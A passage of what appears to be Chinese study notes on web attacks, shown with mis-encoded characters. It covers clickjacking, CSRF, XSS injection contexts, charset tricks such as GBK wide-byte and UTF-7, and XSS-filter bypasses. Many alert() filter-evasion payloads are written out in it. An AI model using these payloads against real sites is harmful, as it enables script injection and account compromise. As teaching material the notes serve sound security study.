class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;hello world&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>**æ‹–æ”¾åŠ«æŒï¼š**å¯åœ¨æ‹–æ”¾è¿‡ç¨‹ä¸­é€šè¿‡dataTransferå…‘ç°çš„setDataä¸getDataå‡½æ•°å®ç°è·¨åŸŸï¼Œ</p>
</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">event.<span class="property">dataTransfer</span>.<span class="title function_">setData</span>(<span class="string">&quot;text&quot;</span>,<span class="string">&quot;someexample&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> text = event.<span class="property">dataTransfer</span>.<span class="title function_">getData</span>(<span class="string">&quot;text&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>è§¦å±åŠ«æŒ</strong>ï¼šä¸¾ä¸ªä¾‹å­ï¼šå°†ç½‘é¡µä¼ªè£…æˆå‘æ¡Œé¢ä¸€æ ·ï¼Œé‚£ä¹ˆç”¨æˆ·å°±æ— æ³•åˆ†è¾¨åˆ°åº•æ˜¯ä¸æ˜¯å†æ¡Œé¢ä¸Šï¼Œå¼¹å‡ºæç¤ºæ¡†æç¤ºä»–è¿›è¡Œæ“ä½œä»è€Œå®ç°è§¦å±åŠ«æŒã€‚ä¼ªè£…æˆæ¡Œé¢éœ€è¦å®ç°ç½‘é¡µå…¨å±ä¸éšè—urlåœ°å€æ æ“ä½œ</li>
</ol>
<p><strong>CSRF</strong>:å¦‚æœæˆ‘ä»¬ä¸ä¹…å‰è®¿é—®è¿‡æŸä¸ªç½‘ç«™ï¼Œä½†è¿™ä¸ªç½‘ç«™å­˜åœ¨csrfæ¼æ´ï¼Œé‚£ä¹ˆå¦‚æœæ”»å‡»è¿™æ„é€ ä¸€ä¸ªè™šå‡çš„ç½‘ç«™ï¼Œå½“æˆ‘ä»¬è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªåˆç†çš„è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¢«æˆåŠŸåœ°æ”»å‡»äº†ã€‚</p>
<p>é˜²å¾¡ï¼šæ ¡éªŒreferer|token ï¼Œtokenå€¼æ˜¯ä¸€ä¸ªä¼ªéšæœºæ•°ï¼Œç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œå‘é€åˆ°å®¢æˆ·ç«¯ä¸çª—å£ç»‘å®šï¼Œä¼ªé€ çš„è¯·æ±‚åº”æ— æ³•è·å–è¯¥tokenï¼Œæ•…ä¸èƒ½æˆåŠŸæ”»å‡»ã€‚</p>
<p><strong>CSRFæ¼æ´ç¡®è®¤</strong>ï¼š</p>
<ol>
<li>ç›®æ ‡è¡¨å•æ˜¯å¦æœ‰æœ‰æ•ˆçš„tokenéšæœºä¸²</li>
<li>ç›®æ ‡è¡¨å•æ˜¯å¦æœ‰éªŒè¯ç </li>
<li>ç›®æ ‡æ˜¯å¦åˆ¤æ–­äº†refereræ¥æº</li>
<li>ç½‘ç«™æ ¹ç›®å½•ä¸‹crossdomain.xmlçš„allow-access-from domain æ˜¯å¦æ˜¯é€šé…ç¬¦</li>
<li>ç›®æ ‡jsonæ•°æ®æ˜¯å¦å¯ä»¥è‡ªå®šä¹‰callbackå‡½æ•°</li>
</ol>
<p><strong>ç•Œé¢æ“ä½œåŠ«æŒç¡®è®¤ï¼š</strong></p>
<ol>
<li>ç›®æ ‡çš„httpå“åº”å¤´æ˜¯å¦è®¾ç½®å¥½äº†X-Frame-Optionså­—æ®µ</li>
<li>ç›®æ ‡æ˜¯å¦æœ‰jsçš„frame Bustinæœºåˆ¶</li>
<li>ä½¿ç”¨iframeç­¾å¦‚ç›®æ ‡ç½‘ç«™æµ‹è¯•ï¼Œè‹¥æˆåŠŸï¼Œåˆ™è¯´æ˜æ¼æ´å­˜åœ¨ã€‚</li>
</ol>
<p><strong><code>&lt;title&gt;&lt;textarea&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;plaintext&gt;&lt;plaintext&gt;ä¸­æ’å…¥jsä»£ç ä¸ä¼šè¢«è§£æ</code></strong></p>
<p>htmlæ ‡ç­¾ä¹‹é—´çš„xssæ³¨å…¥ï¼Œå¯ç›´æ¥è¾“å…¥scriptä»£ç </p>
<p>htmlæ ‡ç­¾å†…çš„xssæ³¨å…¥ï¼Œå¯é€šè¿‡é—­åˆå±æ€§æ ‡ç­¾æˆ–è€…ç›´æ¥é—­åˆæ ‡ç­¾ä¸¤ç§æ–¹å¼å®ç°ã€‚</p>
<p>å¯¹äºéšè—çš„è¡¨å•ï¼Œä¸€èˆ¬é€šè¿‡é—­åˆå±æ€§æˆåŠŸç‡æ›´é«˜ï¼Œåº”ä¸ºï¼Œå†æ ‡ç­¾é—´çš„æ³¨å…¥ä½¿ç”¨äº†&lt;&gt;ï¼Œè€Œè¿™ä¸¤ä¸ªç¬¦å·ä¸€éä¼šè¢«ç½‘ç«™çš„å®‰å…¨æªæ–½è¿‡æ»¤æ‰æˆ–è€…ç¼–ç ã€‚è¿˜æœ‰å°±æ˜¯ï¼Œå¦‚æœå†inputæ ‡ç­¾ä¸­ï¼Œtypeå­—æ®µåœ¨æˆ‘ä»¬çš„è¾“å…¥ç‚¹ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨payloadä¸­é‡æ–°å®šä¹‰typeä¸ºtextï¼Œå¦‚type&#x3D;â€textâ€ï¼Œè¿™æ ·å°±å¾—åˆ°äº†ä¸€ä¸ªå¯»å¸¸çš„è¾“å…¥æ¡†ã€‚</p>
<p>**jsä¼ªåè®®ï¼š**javascript:åé¢çš„å†…å®¹ä¼šè¢«å½“ä½œjsä»£ç æ¥æ‰§è¡Œï¼Œå¦‚æœå­˜åœ¨å¤šæ¡è¯­å¥ï¼Œéœ€è¦ç”¨åˆ†å·åˆ†å‰²ï¼Œä¸”æœ€åä¸€æ¡è¯­å¥çš„æ‰§è¡Œç»“æœä¼šè¢«è¾“å‡ºåœ¨é¡µé¢ä¸Šï¼Œå¦‚æœä¸æƒ³èµ·è¾“å…¥åœ¨é¡µé¢ä¸Šï¼Œåˆ™ä½¿ç”¨ä¸€å¥void 0ï¼›æ¥è¿›è¡Œå±è”½</p>
<p><strong>dataåè®®</strong>ï¼š data:text&#x2F;javascript;base64,base64ç¼–ç åçš„jsä»£ç </p>
<p>**expression:**åœ¨styleå±æ€§æˆ–è€…æ ·å¼è¡¨æ–‡ä»¶ä¸­ä½¿ç”¨expressionå¯ä»¥æ‰§è¡Œjsä»£ç ï¼Œåªå¯¹<code>IEæµè§ˆå™¨</code>ç”Ÿæ•ˆ</p>
<p><code>1ï¼›xss:expression(if(!window.x&#123;alert(1);window.x=1;&#125;))</code>  é¿å…ieé™·å…¥æ­»å¾ªç¯</p>
<p>htmlä»£ç ä¸­å±æ€§çš„å€¼å¯ä»¥é€šè¿‡æ²¡æœ‰å¼•å·ã€å•å¼•å·ã€åŒå¼•å·ã€åå•å¼•å·ï¼ˆieæµè§ˆå™¨ï¼‰,æ•…åœ¨æ¢æµ‹çš„æ—¶å€™ï¼Œåº”æ³¨æ„åˆ¤æ–­å±æ€§å€¼çš„é—­åˆæ–¹å¼ã€‚</p>
<p>è¾“å…¥çš„å€¼è‹¥è¢«jså¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é—­åˆjsä»£ç çš„æ–¹å¼æ¥æ’å…¥æˆ‘ä»¬éœ€è¦çš„ä»£ç ã€‚å¦‚</p>
<p><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code>  #é—­åˆæ ‡ç­¾</p>
<p>æˆ–è€…</p>
<p><code>&quot;;alert(1111)//(æ³¨é‡Šæ‰åé¢çš„é‚£å†…å®¹)</code> #ç›´æ¥é—­åˆä»£ç </p>
<p>å¦‚æœ<code>æ³¨é‡Šç¬¦å·//è¢«è¿‡æ»¤äº†</code>å¯ä»¥é€šè¿‡ä½¿ç”¨ç®—æ•°è¿ç®—ç¬¦æˆ–è€…é€»è¾‘è¿ç®—ç¬¦çš„æ–¹å¼ç»•è¿‡ï¼Œå› ä¸ºjsæ˜¯ä¸€é—¨å¼±ç±»å‹çš„è¯­è¨€ï¼Œæ‰€ä»¥å­—ç¬¦é—´çš„è¿ç®—æ—¶å¯ä»¥çš„</p>
<p><strong><code>&lt;title&gt;&lt;textarea&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;xmp&gt;æ ‡ç­¾ä¸­çš„å†…å®¹ä¼šè¢«htmlç¼–ç ï¼Œä½†&lt;plaintxt&gt;æ ‡ç­¾åœ¨firefoxä¸­ä¸ä¼šè¢«ç¼–ç ï¼Œä½†åœ¨chromeä¸­ä¼šè¢«ç¼–ç ï¼Œè¿™å¯èƒ½å¯¼è‡´åœ¨firefoxä¸­å‡ºç°å®‰å…¨é—®é¢˜</code></strong> </p>
<p>ä½¿ç”¨webkitå†…æ ¸çš„æµè§ˆå™¨ï¼Œè·å–textareaæ ‡ç­¾çš„innerHTMLå€¼çš„æ—¶å€™ï¼Œå†…å®¹ä¸ä¼šè¢«ç¼–ç ã€‚</p>
<p>åœ¨PHPä¸­é€šè¿‡$_SERVER[â€˜qurey_stringâ€™]æ–¹æ³•è·å–çš„æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯urlencodeç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œè€Œé€šè¿‡$_GET[â€˜quret_stringâ€™]æ–¹æ³•è·å–çš„æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯urlencodeç¼–ç å‰çš„å­—ç¬¦ä¸²ã€‚</p>
<p>ä¸åŒæµè§ˆå™¨é’ˆå¯¹ç‰¹æ®Šå­—ç¬¦çš„urlç¼–ç ç­–ç•¥ä¸ä¸€è‡´å¯¼è‡´å¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´</p>
<p>firefox:ç¼–ç äº†â€™â€&lt;&gt;&#96;</p>
<p>chrome:ç¼–ç äº†&lt;&gt;</p>
<p>IEï¼šä¸åšä»»ä½•ç¼–ç </p>
<p>è¿™å¯¼è‡´å¦‚æœæœåŠ¡ç«¯é’ˆå¯¹urlä¸­ç”¨æˆ·çš„è¾“å…¥éƒ¨åˆ†ä¸åšä»»ä½•è¿‡æ»¤ï¼Œé‚£ä¹ˆIEæµè§ˆå™¨ä¸­å°†å‡ºç°æ¼æ´ï¼Œchormeä¸­ä¼šå‡ºç°ä¸€äº›æ¼æ´ï¼Œfirefoxç›¸å¯¹è¾ƒå®‰å…¨ã€‚</p>
<p>åœ¨chormeæµè§ˆå™¨ä¸­ï¼Œ#åçš„æ‰€æœ‰å†…å®¹éƒ½ä¸ä¼šè¢«ç¼–ç ï¼Œæ•…é€šè¿‡è¯¥æ–¹æ³•æˆ‘ä»¬å¯ä»¥åœ¨chormeä¸‹è§¦å‘DOMXSSæ”»å‡»ã€‚ï¼ˆå®é™…ä¸Šä¼šè¢«chormeçš„xss filteræ‹¦æˆªæ‰ï¼Œæˆ‘ä»¬éœ€è¦çªç ´è¿™å±‚æ‹¦æˆªï¼‰</p>
<p>DOMçš„ä¿®æ­£å¼æ¸²æŸ“ï¼Œæµè§ˆå™¨ä¼šåœ¨æ¸²æŸ“domæ ‘çš„æ—¶å€™å¯¹htmlå†…å®¹è¿›è¡Œä¿®æ­£ï¼Œä¹Ÿå«DOMé‡æ„ï¼ŒDOMé‡æ„åˆ†ä¸ºé™æ€é‡æ„ä¸åŠ¨æ€é‡æ„ï¼Œå…¶å·®åˆ«åœ¨äºæœ‰æ²¡æœ‰jsçš„å‚ä¸ï¼Œä¿®æ­£åŒ…æ‹¬ä¸‹é¢çš„å†…å®¹ï¼šæ ‡ç­¾æ­£ç¡®é—­åˆã€å±æ€§æ­£ç¡®é—­åˆã€‚</p>
<h3 id="å­—ç¬¦ä¸å­—ç¬¦é›†å¯¼è‡´çš„å®‰å…¨é—®é¢˜"><a href="#å­—ç¬¦ä¸å­—ç¬¦é›†å¯¼è‡´çš„å®‰å…¨é—®é¢˜" class="headerlink" title="å­—ç¬¦ä¸å­—ç¬¦é›†å¯¼è‡´çš„å®‰å…¨é—®é¢˜"></a>å­—ç¬¦ä¸å­—ç¬¦é›†å¯¼è‡´çš„å®‰å…¨é—®é¢˜</h3><p><strong>å®½å­—èŠ‚ç¼–ç é—®é¢˜</strong></p>
<p>å¦‚æœç½‘é¡µçš„ç¼–ç æ–¹å¼æ—¶GBK\GB2312ç­‰å®½å­—èŠ‚ç¼–ç åˆ™å¯èƒ½å­˜åœ¨å®½å­—èŠ‚ç»•è¿‡é£é™©</p>
<p>åœ¨PHPä¸­å¦‚æœå¼€å¯äº†<code>magic_quotes_gpc=on</code>çš„è¯åˆ™å¯èƒ½è§¦å‘å®½å­—èŠ‚æ³¨å…¥ã€‚ä¸”è¯¥åŠŸèƒ½æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå¦‚æœæ²¡æœ‰å…³é—­è¯¥åŠŸèƒ½åˆ™å­˜åœ¨é£é™©ã€‚</p>
<p>GBKçš„ç¼–ç æ˜¯åˆ†ä¸ºé«˜å­—èŠ‚ä¸ä½å­—èŠ‚ä¸¤ä¸ªéƒ¨åˆ†çš„ï¼Œå¦‚æœåœ¨ä¸€ä¸ªä½å­—èŠ‚é’±å‰é¢å‡ºç°äº†ä¸€ä¸ªåˆæ³•çš„é«˜å­—èŠ‚çš„è¯ï¼Œè¿™ä¸¤ä¸ªå­—èŠ‚åˆ™ä¼šè¢«è®¤ä¸ºè¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œä»è€Œå®ç°ç»•è¿‡ã€‚è¿™é‡Œå°±ä½“ç°å‡ºäº†magic_quotes_gpcå¼€å¯çš„å…³é”®æ‰€åœ¨äº†ã€‚å½“è¯¥åŠŸèƒ½è¢«å¼€å¯æ—¶ï¼Œè¾“å…¥çš„å­—ç¬¦â€™â€\ç­‰é»˜è®¤ä¼šè¢«è½¬ä¹‰ï¼Œä¹Ÿå°±æ˜¯åœ¨å‰é¢æ·»åŠ ä¸€ä¸ª\ï¼Œè¯¥æ–œçº¿çš„åå…­è¿›åˆ¶è¡¨ç¤ºä¸º0x5cï¼Œåˆšå¥½å‡ºç°åœ¨äº†GBKçš„ä½å­—èŠ‚åŒºåŸŸï¼Œé‚£ä¹ˆå¦‚æœå…¶å‰é¢å‡ºç°ä¸€ä¸ªåˆç†çš„é«˜å­—èŠ‚çš„è¯ï¼Œè¿™è¿ä¸ªå­—èŠ‚å°±ä¼šè¢«è®¤ä¸ºè¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œä»è€Œç»•å¼€è½¬ä¹‰å®ç°çªç ´ã€‚GB2312æ˜¯è¢«GBKå…¼å®¹çš„ï¼Œä½†\åœ¨GB2312çš„ç¼–ç ä¸­å¹¶æ²¡æœ‰å‡ºç°åœ¨å…¶åˆç†çš„ä½å­—èŠ‚åŒºåŸŸå†…éƒ¨ï¼ŒæŒ‰ç†è¯´æ˜¯ä¸å­˜åœ¨é—®é¢˜çš„ï¼Œä½†æµè§ˆå™¨åœ¨è§£æçš„æ—¶å€™ï¼Œæ˜¯å°†GB2312æŒ‰ç…§GBKçš„æ–¹å¼æ¥è¿›è¡Œè§£æçš„ï¼Œè¿™æ ·åŒæ ·ä¼šå‡ºç°é—®é¢˜ã€‚</p>
<p><strong>UTF7å¯¼è‡´çš„é—®é¢˜</strong></p>
<p>å½“å‰åªæœ‰IEè¿˜æ”¯æŒå¯¹UTF7çš„è§£æ</p>
<p>åœ¨ie6\7æ—¶ä»£å¦‚æœhttpçš„å“åº”å¤´ä¸­æ²¡æœ‰æŒ‡å®šå­—ç¬¦é›†ç¼–ç æ–¹å¼æˆ–è€…å£°æ˜é”™è¯¯ï¼ŒåŒæ—¶åœ¨metaæœªæŒ‡å®šcharsetæˆ–æŒ‡å®šé”™è¯¯ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šåˆ¤æ–­å“åº”å†…å®¹ä¸­æ˜¯å¦å‡ºç°UTF7ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå­˜åœ¨ï¼Œå½“å‰é¡µé¢å°†ä¼šæŒ‰ç…§UTF7çš„æ–¹å¼è¿›è¡Œè§£ç ã€‚</p>
<p>å¯ä»¥é€šè¿‡<link>æ ‡ç­¾æ¥å¼•å…¥å¤–åŸŸçš„utf7ç¼–ç çš„cssæ–‡ä»¶ï¼Œåœ¨cssæ–‡ä»¶ä¸­é€šè¿‡<code>expression</code>æ¥æ‰§è¡Œjsä»£ç </p>
<p><strong>BOM(æ ‡è®°å­—èŠ‚é¡ºåºç byte order mark),åª</strong>å‡ºç°åœ¨unicodeå­—ç¬¦é›†ä¸­ï¼Œbomå‡ºç°åœ¨æ–‡ä»¶çš„å¼€å§‹æ–‡èŒï¼Œè½¯ä»¶é€šè¿‡åˆ¤æ–­bomæ¥åˆ¤æ–­ä»–çš„unicodeå­—ç¬¦é›†çš„ç¼–ç æ–¹å¼ï¼Œå¦‚æœå‘ç°äº†+&#x2F;v8è¿™æ ·çš„å­—ç¬¦ï¼Œé‚£ä¹ˆåˆ™ä»¥utf7çš„æ–¹å¼æ¥è§£æç½‘é¡µï¼Œä»è€Œç»•è¿‡è¿‡æ»¤æœºåˆ¶ã€‚åœ¨å®è·µä¸­ï¼Œèƒ½å¤Ÿæ§åˆ¶ç½‘é¡µå¼€å¤´éƒ¨åˆ†çš„åŠŸèƒ½ä¸ºï¼šç”¨æˆ·è‡ªå®šä¹‰çš„cssæ ·å¼æ¸©æ±Ÿï¼Œjsoncallbackç±»å‹çš„æ¥è¿æ¥ï¼Œå‡ºç°åœ¨web2.0ä¸­ã€‚é˜²å¾¡è¿™ç±»çš„æ”»å‡»æœ€æœ‰æ•ˆçš„æ–¹å¼æ˜¯å¼ºåˆ¶åœ¨æ–‡ä»¶çš„å¼€å¤´åŠ ä¸Šä¸€ä¸ªç©ºæ ¼ã€‚</p>
<p><strong>ç»•è¿‡XSS Filter</strong></p>
<p>å“åº”å¤´<code>CRLF</code>æ³¨å…¥ç»•è¿‡</p>
<p><code>CRLF,å³å›è½¦æ¢è¡Œç¬¦</code>ï¼Œåœ¨windowsè¡¨ç¤ºæ–°çš„ä¸€è¡Œï¼Œå›è½¦ï¼Œå³åœ¨åŒä¸€è¡Œä½†å›åˆ°è¡Œé¦–ï¼Œæ¢è¡Œï¼Œä¸Šç§»ä¸€è¡Œä½†æ°´å¹³ä½ç½®ä¸å˜ã€‚</p>
<p>å¦‚æœç½‘é¡µå­˜åœ¨CRLFæ³¨å…¥ï¼Œåœ¨HTTPåè®®ä¸­æ³¨å…¥å›è½¦æ¢è¡Œç¬¦ï¼ˆ%0d%0aï¼‰å°±å¯ä»¥æ³¨å…¥å¤´éƒ¨ï¼Œå› ä¸ºurlåªæœ‰ç¬¬ä¸€è¡Œæ˜¯å¤´éƒ¨ï¼Œæ¢è¡Œå›è½¦åçš„å†…å®¹ä¼šè¢«å½“æˆå“åº”å†…å®¹å“åº”å›æ¥ã€‚å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ³¨å…¥<code>X-XSS-Protection:0</code> æ¥å…³é—­XSS Filter</p>
<p>åŒåŸŸç™½åå•</p>
<p>iEæµè§ˆå™¨é€šè¿‡refereråˆ¤æ–­æ˜¯å¦æ¥è‡ªåŒåŸŸï¼Œå¦‚æœæ˜¯åˆ™xss filterä¸ç”Ÿæ•ˆã€‚å¯é€šè¿‡åµŒå…¥<code>&lt;a&gt;</code>æ ‡ç­¾æˆ–è€…<code>&lt;iframe&gt;</code>æ ‡ç­¾æ¥è¾¾åˆ°åŒåŸŸçš„ç›®çš„</p>
<p>chromeæµè§ˆå™¨å¦‚æœæ˜¯é€šè¿‡<code>&lt;script&gt;</code>åµŒå…¥çš„åŒåŸŸå†…çš„<code>js</code>æ–‡ä»¶ï¼Œ<code>XSS</code> Filteråˆ™å®Œå…¨ä¸ä¼šå·¥ä½œã€‚</p>
<p>åœºæ™¯ä¾èµ–æ€§é«˜çš„ç»•è¿‡</p>
<p>å¦‚æœè¾“å…¥å†…å®¹ç›´æ¥å‡ºç°åœ¨jsä»£ç ä¸­ï¼Œè¿™æ ·XSSfilterå°±æ— æ³•é˜²å¾¡ã€‚</p>
<p>å¦‚æœphpå¼€å¯äº†GPCåŠŸèƒ½ï¼Œé‚£ä¹ˆå¯ä»¥ç»™é€šè¿‡åœ¨payloadä¸­æ’å…¥%00æ¥åœ¨IEä¸­å®ç°ç»•è¿‡ã€‚å› ä¸º%00ä¼šè¢«è½¬æ¢ä¸º\0</p>
<h3 id="ä»£ç æ··æ·†"><a href="#ä»£ç æ··æ·†" class="headerlink" title="ä»£ç æ··æ·†"></a>ä»£ç æ··æ·†</h3><p><strong>è¿›åˆ¶å¸¸è¯†</strong></p>
<p>htmlä»£ç ä¸­å¯ä»¥è¯†åˆ«<code>åè¿›åˆ¶ä¸åå…­è¿›åˆ¶</code>ä¸¤ç§ï¼Œé€šè¿‡&#12; è¡¨ç¤ºåè¿›åˆ¶ï¼Œ&amp;#x2fè¡¨ç¤ºåå…­è¿›åˆ¶ã€‚</p>
<p>cssä¸­èƒ½å¤Ÿå…¼å®¹htmlä»£ç çš„è¿›åˆ¶è¡¨ç¤ºæ–¹å¼ï¼Œcssä¸­å¯ä»¥ä½¿ç”¨\6cè¿™æ ·çš„1x6è¿›åˆ¶è¡¨ç¤ºæ–¹å¼ã€‚ç¼–ç çš„æ—¶å€™æ³¨æ„è¦å°†csså±æ€§çš„ï¼šç•™å‡ºæ¥ä¸èƒ½ç¼–ç ï¼Œå¦åˆ™ä¸èƒ½æ­£ç¡®è§£æã€‚</p>
<p>jsä¸­èƒ½è¿‡å¤Ÿç›´æ¥æ‰§è¡Œå¸¦æœ‰<code>å…«è¿›åˆ¶ä¸åå…­è¿›åˆ¶</code>çš„ä¸¤ç§ç¼–ç æ–¹å¼ã€‚è¿™ä¸¤ç§è¿›åˆ¶å¯ä»¥ç›´æ¥è¢«jsä»£ç è¯†åˆ«å¹¶æ‰§è¡Œï¼Œå…«è¿›åˆ¶ç”¨\23è¡¨ç¤º åå…­è¿›åˆ¶ç”¨\x2eè¡¨ç¤ºã€‚è¿™ä¸¤ç§æ–¹å¼åªèƒ½ç»™å•å­—èŠ‚ç¼–ç ä¹Ÿå°±æ˜¯asciiç ï¼Œå¦‚æœå‡ºç°äº†å¤šå­—èŠ‚ç¼–ç ï¼Œåˆ™éœ€è¦é€šè¿‡16è¿›åˆ¶æ¥è¡¨ç¤ºã€‚\u2345ã€‚åè¿›åˆ¶è™½ç„¶ä¸èƒ½ç›´æ¥æ‰§è¡Œï¼Œä½†å¯ä»¥é€šè¿‡<code>String.fromCharCode(code,jinzhi)</code>æ¥è§£ç ï¼Œç„¶åå†äº¤ç»™evalå‡½æ•°æ‰§è¡Œã€‚</p>
<p>åè¿›åˆ¶çš„æ•°å­—å¯ä»¥æŒ‡å®šä½æ•°ï¼Œä¸è¶³çš„é€šè¿‡0æ¥è¡¥é½ï¼Œå¦‚&#1234; &#0024; è¿™ç§ã€‚<code>è¿™ç§ç‰¹æ€§å¯ä»¥åˆ©ç”¨æ¥ç»•è¿‡è¿‡æ»¤ç­–ç•¥</code> å½“ç„¶ï¼Œä½æ•°æœ‰æ—¶å€™è¿˜å—åˆ°æµè§ˆå™¨æœ¬èº«çš„é™åˆ¶ã€‚</p>
<p><strong>JSåŠ è§£å¯†</strong></p>
<p>jsæä¾›äº†ä¸‰å¯¹ç¼–è§£ç å‡½æ•°</p>
<ol>
<li>escape|unescape</li>
<li>encodeURI|decodeURI</li>
<li>encodeURIComponent|decodeURIComponent</li>
</ol>
<p>ä¸Šè¿°ä¸‰ä¸ªå‡½æ•°ä¸ç¼–ç çš„å­—ç¬¦ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡å‡å°‘ï¼Œæ‰€ä»¥ä½¿ç”¨ç¬¬3ä¸ªç›¸å¯¹æ¯”è¾ƒå®‰å…¨</p>
<p><strong>HTMLä¸­çš„ä»£ç æ³¨å…¥æŠ€å·§</strong></p>
<p><strong>æ ‡ç­¾ä¸­çš„æ³¨å…¥</strong></p>
<ol>
<li><p>HTMLä»£ç ä¸åŒºåˆ†å¤§å°å†™ï¼Œå¯ä»¥é€šè¿‡å¤§å°å†™æ¥å®ç°æ··æ·†</p>
</li>
<li><p>HTMLæ ‡ç­¾å­˜åœ¨ä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œç”šè‡³æœ‰çš„ä¼˜å…ˆçº§é«˜çš„æ ‡ç­¾å¯ä»¥æˆªæ–­å…¶ä»–çš„æ ‡ç­¾ï¼Œä»è€Œç’è¿‡è¿‡æ»¤å™¨ã€‚å¦‚<code>&lt;style&gt;&lt;title&gt;</code>æ ‡ç­¾</p>
<ol>
<li><p><code>&lt;title&gt;&lt;a href=&quot;&lt;title&gt;&lt;img src=x onerror=alert(1111)&gt;//&quot;&gt;</code> #è¿‡æ»¤å™¨è®¤ä¸ºæ˜¯ä¸€ä¸ªtitleæ ‡ç­¾åŠ ä¸€ä¸ªaæ ‡ç­¾ï¼Œæµè§ˆå™¨è®¤ä¸ºæ˜¯ä¸€å¯¹titleæ ‡ç­¾åŠ ä¸€ä¸ªimgæ ‡ç­¾ã€‚</p>
</li>
<li><p>å¦‚æœä¸Šè¿°æ ‡ç­¾è¢«è¿‡æ»¤äº†å¯ä»¥å°è¯•ä½¿ç”¨å¦‚ä¸‹æ–¹å¼</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. &lt;? foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line">2. &lt;! foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line">3. &lt;/  foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;# å‰ä¸‰ç§å†firefoxå’Œwebkitå†…æ ¸ä¸­æœ‰æ•ˆ</span><br><span class="line">4. &lt;% foo=&quot;%&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&gt; #IEä¸­æœ‰æ•ˆ</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>å¯ä»¥å†HTMLä»£ç ä¸­æ’å…¥xmlä»£ç ã€svgä»£ç ã€å’ŒæœªçŸ¥æ ‡ç­¾æ¥ç’è¿‡è¿‡æ»¤å™¨</p>
<ol>
<li><code>&lt;xss style=&quot;xss:expression(alert(1111))&quot;&gt;</code> #é€šè¿‡è¯¥æ–¹å¼å†IEä¸­æ‰§è¡Œæ’å…¥çš„ä»£ç ï¼Œå¯ä»¥ç’è¿‡è¿‡æ»¤å™¨</li>
</ol>
</li>
<li><p>ä½¿ç”¨å°‘è§çš„æ ‡ç­¾ç»•è¿‡è¿‡æ»¤å™¨</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(1111)&quot;</span>&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(111)&quot;</span>&gt;</span></span><br><span class="line">3. <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-wquiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0;javascript:alert(111)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>é€šè¿‡åˆ†æè¿‡æ»¤å™¨çš„ç¼ºé™·æ„é€ å¯ä»¥ç»•è¿‡çš„è¯­å¥</p>
<ol>
<li>å¦‚æœä»£ç ä¸­è¿‡æ»¤æ³¨é‡Šçš„è¯­å¥æ˜¯è¿™æ ·çš„<code>&lt;!â€”.*â€”&gt;</code>åˆ™å¯ä»¥æ„é€ è¿™æ ·çš„è¯­å¥<code>&lt;!â€”aaa &lt;!â€”bbbâ€”&gt; cccâ€”&gt;ddd</code> è¿™æ ·cccå°±è¢«æš´éœ²å‡ºæ¥äº†</li>
